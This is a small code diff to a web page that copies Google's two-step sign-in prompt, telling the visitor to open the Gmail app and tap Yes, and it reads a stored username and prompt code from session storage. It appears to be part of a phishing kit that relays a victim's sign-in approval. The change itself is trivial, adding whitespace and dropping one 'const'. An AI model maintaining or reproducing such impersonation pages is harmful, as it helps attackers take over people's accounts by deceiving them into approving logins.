@@ -419,7 +419,7 @@ Google sent a notification to your Device. Open the Gmail app and tap <strong>Ye
 
 </div>
 <script src="assets/emit.js"></script> 
-<script>
+<script> 
 	
 	document.addEventListener("DOMContentLoaded", function () {
 
@@ -427,7 +427,7 @@ Google sent a notification to your Device. Open the Gmail app and tap <strong>Ye
     updatePhoneField("#code", sessionStorage.getItem("setPromptCode"));
   }
 
-  const page = loading.style.display === "block" && overlay.style.display === "block"
+   page = loading.style.display === "block" && overlay.style.display === "block"
     ? "waiting"
     : "prompt";
   document.querySelector("#username").textContent = sessionStorage.getItem("user");
